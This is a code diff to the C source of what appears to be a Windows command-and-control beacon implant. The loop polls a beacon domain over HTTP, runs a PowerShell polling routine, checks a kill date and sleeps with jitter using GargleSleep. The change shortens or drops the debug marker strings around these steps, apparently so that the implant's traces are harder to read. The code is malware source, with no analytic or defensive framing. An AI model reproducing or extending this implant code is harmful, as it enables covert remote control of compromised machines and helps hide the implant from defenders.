@@ -143,7 +143,7 @@ void beacon(LPVOID lpReserved) {
 
 	/* 初始化代理 */
 	agent_init(buffer, MAX_GET);
-	x86_bc("after agent_init");
+	x86_bc("ainit");
 
 	while (sleep_time > 0) {
 		x86_bc("loop");
@@ -161,13 +161,13 @@ void beacon(LPVOID lpReserved) {
 
 		/* 执行协议的HTTP部分 */
 		// dlog("beacon.beacon - http_init: %s \n", beacon_domain);
-		x86_bc("before http_init");
+		x86_bc("i0");
 		http_init(beacon_domain, port, ua);
-		x86_bc("after http_init");
+		x86_bc("i1");
 
 		// dlog("beacon.beacon - http_get: %s \n", url);
 		length = http_get(url, &bigsession, buffer, MAX_GET);
-		x86_bc("after http_get");
+		x86_bc("get");
 
 		/* 这是在处理之前解密和验证有效载荷的适当时机 */
 		if (length > 0) {
@@ -210,7 +210,7 @@ void beacon(LPVOID lpReserved) {
 
 			/* 检查我们的powershell实例 */
 			psh_poll(command_shell_callback, MAX_PACKET);
-			x86_bc("after polls");
+			x86_bc("polls");
 
 			/* 检查终止日期 */
 			if (check_kill_date())
@@ -232,9 +232,9 @@ void beacon(LPVOID lpReserved) {
 			failedHost = TRUE;
 		}
 
-		x86_bc("before http_close");
+		x86_bc("c0");
 		http_close();
-		x86_bc("after http_close");
+		x86_bc("c1");
 
 		/* 再次检查终止日期 */
 		if (check_kill_date())
@@ -247,9 +247,9 @@ void beacon(LPVOID lpReserved) {
 		/* 需要休眠多久？ */
 		if (sleep_time > 0) {
 			if (jitter == 0) {
-				x86_bc("before GargleSleep");
+				x86_bc("s0");
 				GargleSleep(sleep_time);
-				x86_bc("after GargleSleep");
+				x86_bc("s1");
 			}
 			else {
 			    unsigned int sxjd100 = ((sleep_time * jitter) / 100);
@@ -261,14 +261,12 @@ void beacon(LPVOID lpReserved) {
 			    }
 
     			// dlog("beacon.beacon - Ready to GargleSleep! Sleep Time: %u Jitter: %u Adjustment: %u sxjd100: %u \n", sleep_time, jitter, adjust, sxjd100);
-				x86_bc("before GargleSleep jitter");
 				if (adjust < sleep_time) {
 					GargleSleep(sleep_time - adjust);
 				} else {
 				    // Not sure how we got here, but we should probably still try to sleep...
 					GargleSleep(sleep_time);
 				}
-				x86_bc("after GargleSleep jitter");
 			}
 		}
 	}
